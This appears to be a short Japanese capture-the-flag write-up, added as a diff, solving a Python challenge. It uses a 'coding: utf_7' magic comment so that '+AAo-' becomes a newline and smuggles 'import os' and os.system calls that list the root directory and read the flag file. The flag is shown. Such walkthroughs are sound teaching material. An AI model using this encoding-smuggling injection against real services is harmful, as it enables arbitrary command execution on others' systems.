@@ -1,0 +1,25 @@
+magic comment 機能があるらしい。
+encoding をファイルの先頭で指定するやつ。
+調べてみると、まさにな記事がヒット。 https://blog.arkark.dev/2022/11/18/seccon-ja/
+utf_7 を指定すると +AAo- が \n に相当するらしい。
+
+Dockerfile を見てみると flag は / にあるらしい。
+しかも md5sum がファイル名に付加されてるらしい。めんどくさー
+
+まず ls をしてみる。
+
+coding: utf_7"
++AAo-import os"
++AAo-os.system('ls /')"
+__EOF__"
+
+はい、flag-437541b5d9499db505f005890ed38f0e.txt
+
+あとは cat する
+
+coding: utf_7
++AAo-import os
++AAo-os.system('cat /flag-437541b5d9499db505f005890ed38f0e.txt')
+__EOF__
+
+ctf4b{c4r3l355_c0mm3n75_c4n_16n173_0nl1n3_0u7r463}
